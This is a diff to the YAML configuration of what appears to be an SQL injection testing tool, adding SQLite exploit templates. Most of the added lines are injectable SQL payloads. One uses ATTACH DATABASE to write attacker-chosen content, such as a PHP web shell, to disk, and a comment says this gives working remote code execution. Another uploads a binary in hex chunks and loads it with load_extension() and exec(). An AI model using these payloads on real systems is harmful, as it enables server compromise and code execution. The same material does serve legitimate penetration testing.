@@ -115,11 +115,26 @@ resource:
     concat: "|| '%7f' ||"
 
  exploit: |
-  # [contribute] share other file, RCE and UDF exploits on GitHub
+  # [contribute] share following exploit methodologies on GitHub to improve the app :
+  # - read and write files
+  # - UDF creation
+  # - RCE
+  
+  # Web RCE working fine despite the file embedded in sqlite format as tag '<?php ?>' is interpreted
   writeFile: |
     ; attach database '%s' as %s
     ; create table %s.%s (c text)
     ; insert into %s.%s (c) values ("%s")
+    /* commit */
+  
+  # not working: writes extension library but not loadable as embedded in sqlite format
+  udf: |
+    create: ; attach database '%s' as %s ; create table %s(d longblob)
+    insertChunks: ; insert into %s(d) values (X'%s')
+    appendChunks: ; update %s set d = d || X'%s'
+    /* jdbc url: ?enable_load_extension=true */
+    loadExtension: select load_extension('%s')
+    run: select exec('%s', 'UTF8')
 
 strategy:
  configuration:
